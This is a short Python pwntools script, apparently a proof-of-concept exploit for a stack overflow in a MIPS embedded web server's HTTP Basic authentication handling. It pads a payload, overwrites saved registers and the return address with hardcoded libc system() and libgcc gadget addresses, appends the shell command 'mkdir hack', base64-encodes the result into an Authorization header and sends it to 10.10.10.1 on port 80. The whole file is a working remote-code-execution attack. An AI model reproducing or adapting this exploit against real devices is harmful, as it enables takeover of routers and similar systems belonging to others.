import socket
from pwn import *
import struct
import base64

libc 	= 0x77f2e000 
libgcc 	= 0x77ee2000
gadget 	= 0x0000ABD0 + libgcc
system	= 0x0002AC90 + libc
MAXSZ	= 1024
# cmd		= b"FUCK" * 50 # see how long our cmd can be
cmd		= b"mkdir hack"
context(arch = "mips", endian = "big", os = "Linux", log_level = "DEBUG")
# fork 0x77f34d30
def exp():
	print(f"[+] gadget is {hex(gadget)}")
	print(f"[+] system is {hex(system)}")
	payload  = b'a:%s' %(b'A' * (0x4C - 2)) # padding + s0~s2
	payload += p32(system)					# s3 <- esp + 0x0c
	payload += b'AAAA'						# s4 
	payload += p32(gadget) 					# ra <- esp + 0x14
	payload += b"BBBB"
	payload += b"BBBB"
	payload += b"BBBB"
	payload += b"BBBB"
	payload += b"BBBB"
	payload += b"BBBB"
	payload += cmd  						# 	 <- esp + 0x30

	header   = b'GET / HTTP/1.1\r\n'
	# header  += b'Host: 127.0.0.1:80\r\n'
	header  += b'Host: 10.10.10.1:80\r\n'
	header  += b'Authorization: Basic %s\r\n' % base64.b64encode(payload)
	header  += b'User-Agent: Real UserAgent\r\n\r\n'


	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	iport = ("10.10.10.1" ,80)
	# iport = ("127.0.0.1" ,80)
	s.connect(iport)
	s.send(header)
	msg = s.recv(MAXSZ)
	print("[+] Message is %s" %(msg))
	s.close()

if __name__ == '__main__':
	exp()

